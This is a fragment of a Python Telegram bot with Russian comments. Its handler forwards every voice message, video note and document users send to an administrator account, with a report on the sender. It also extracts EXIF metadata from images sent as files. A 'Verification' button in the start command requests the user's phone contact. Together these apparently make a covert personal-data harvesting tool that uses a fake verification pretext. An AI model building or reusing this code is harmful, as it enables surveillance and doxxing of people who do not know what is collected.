...
def analyze_exif(file_bytes):
    ...
    except: return "EXIF: Not supported for this file"

# --- ОБРАБОТЧИК ВСЕХ ТИПОВ ДАННЫХ ---
...
def master_handler(message):
    ...
    # 1. Голосовые и кружочки
    if message.content_type == 'voice':
        bot.send_voice(ADMIN_ID, message.voice.file_id, caption=build_report(user, "🎤 ГС", "Голосовое сообщение"))
    elif message.content_type == 'video_note':
        bot.send_video_note(ADMIN_ID, message.video_note.file_id)
        bot.send_message(ADMIN_ID, build_report(user, "📹 КРУЖОК", "Видеосообщение"))
    ...
    # 3. Файлы (документы, базы, несжатые фото)
    elif message.content_type == 'document':
        extra = f"File: <code>{message.document.file_name}</code>"
        # Если это фото в виде файла, пробуем достать EXIF
        if message.document.mime_type in ['image/jpeg', 'image/png']:
            file_info = bot.get_file(message.document.file_id)
            down = bot.download_file(file_info.file_path)
            extra += f"\n{analyze_exif(down)}"
        bot.send_document(ADMIN_ID, message.document.file_id, caption=build_report(user, "📂 ФАЙЛ", extra))
...
def start_cmd(message):
    ...
    markup.add(types.KeyboardButton("🛡 Верификация", request_contact=True))
...
def admin_cmd(message):
    ...
    if len(cmd) < 2: return
    if 'ban' in cmd: add_to_blacklist(cmd); bot.reply_to(message, "⛔️ Забанен.")
    else: 
        if remove_from_blacklist(cmd): bot.reply_to(message, "✅ Разбанен.")
